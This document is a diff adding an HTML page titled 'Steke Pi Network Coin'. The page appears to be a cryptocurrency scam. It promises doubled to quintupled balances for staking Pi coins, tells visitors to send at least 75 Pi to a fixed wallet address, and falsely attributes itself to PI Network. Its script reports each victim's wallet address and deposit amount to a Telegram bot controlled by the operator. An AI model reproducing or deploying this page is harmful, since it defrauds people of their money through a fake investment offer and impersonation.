@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steke Pi Network Coin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f3f0ff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #6a0dad;
+        }
+        .rewards button {
+            background: #6a0dad;
+            color: white;
+            padding: 10px;
+            border: none;
+            font-size: 18px;
+            margin: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .rewards button:hover {
+            background: #530b9b;
+        }
+        .deposit-form {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+            background: #f2e6ff;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .deposit-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .deposit-form button {
+            background: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 100%;
+        }
+        .deposit-form button:hover {
+            background: #218838;
+        }
+        .copy-btn {
+            background: #ff9900;
+            border: none;
+            color: white;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .copy-btn:hover {
+            background: #e68a00;
+        }
+        .tutorial {
+            margin-top: 30px;
+            text-align: left;
+            background: #e0c3fc;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .tutorial img {
+            width: 100%;
+            border-radius: 10px;
+            margin-top: 10px;
+        }
+        footer {
+            margin-top: 20px;
+            padding: 10px;
+            background: #6a0dad;
+            color: white;
+        }
+    </style>
+  <div id="stakedBalance" style="font-size: 20px; font-weight: bold; color: #6a0dad; margin-bottom: 15px;">
+        Pi Coin Staked at now: <span id="stakedAmount">228,239</span> PI
+    </div>
+</head>
+<body>
+    <div class="container">
+        <h1>Steke Pi Network Coin</h1>
+        <p>Choose your staking plan:</p>
+        
+        <div class="rewards">
+            <button onclick="showDepositForm(1, 2)">📅 1 Month → 2x Balance</button>
+            <button onclick="showDepositForm(2, 3)">📅 2 Months → 3x Balance</button>
+            <button onclick="showDepositForm(3, 5)">📅 3 Months → 5x Balance</button>
+        </div>
+
+        <div id="depositForm" class="deposit-form">
+            <h3>Deposit Details</h3>
+            <label>Wallet Address:</label>
+            <input type="text" id="walletAddress" value="MBC6NRTTQLRCABQHIR5J4R4YDJWFWRAO4ZRQIM2SVI5GSIZ2HZ42QAAAAAAPJNMS5EBNM" readonly>
+            <button class="copy-btn" onclick="copyWallet()">Copy</button>
+
+            <label>Deposit Time:</label>
+            <input type="text" id="depositTime" readonly>
+
+            <label>Enter Your Address:</label>
+            <input type="text" id="userAddress" placeholder="Your wallet address" required>
+
+            <label>Amount:</label>
+            <input type="number" id="depositAmount" placeholder="Enter amount" required>
+
+            <button onclick="submitDeposit()">Submit Staking</button>
+        </div>
+
+        <div class="tutorial">
+            <h3>How to Stake Pi?</h3>
+            <p>1. Choose a staking plan above.</p>
+            <p>2. Copy the wallet address and send the Pi coins.</p>
+            <p>3. The minimum amount of transmission is 75 pi !!</p>
+            <p>4. Your staking will be activated automatically!</p>
+            <img src="https://i.postimg.cc/dVZzw67C/Snapchat-609991449.jpg" alt="Staking Tutorial">
+          <img src="https://i.postimg.cc/JhcYz2Rs/Snapchat-149502263.jpg" alt="Staking Tutorial">
+        </div>
+    </div>
+
+    <footer>
+        Copyright by PI Network @2025
+    </footer>
+
+    <script>
+        function showDepositForm(months, multiplier) {
+            document.getElementById("depositForm").style.display = "block";
+            document.getElementById("depositTime").value = new Date().toLocaleString();
+        }
+
+        function submitDeposit() {
+            let wallet = document.getElementById("walletAddress").value;
+            let userAddress = document.getElementById("userAddress").value; 
+            let time = document.getElementById("depositTime").value;
+            let amount = document.getElementById("depositAmount").value;
+
+            if (amount === "" || amount <= 0) {
+                alert("Please enter a valid deposit amount.");
+                return;
+            }
+
+            if (userAddress === "") {
+                alert("Please enter your wallet address.");
+                return;
+            }
+
+            let message = `🔹 *New Staking Request*\n\n` +
+                          `💳 *Wallet:* ${wallet}\n` +
+                          `📍 *User Address:* ${userAddress}\n` +
+                          `⏰ *Time:* ${time}\n` +
+                          `💰 *Amount:* ${amount}`;
+
+            let botToken = process.env.BOT_ID;  
+            let chatId = process.env.CHAT_ID;  
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert("✅ Staking request sent successfully!");
+                    } else {
+                        alert("❌ Failed to send request.");
+                    }
+                })
+                .catch(error => {
+                    alert("⚠ Error sending request: " + error);
+                });
+        }
+
+        function copyWallet() {
+            let walletInput = document.getElementById("walletAddress");
+            walletInput.select();
+            document.execCommand("copy");
+            alert("Wallet address copied!");
+        }
+    </script>
+</body>
+</html>
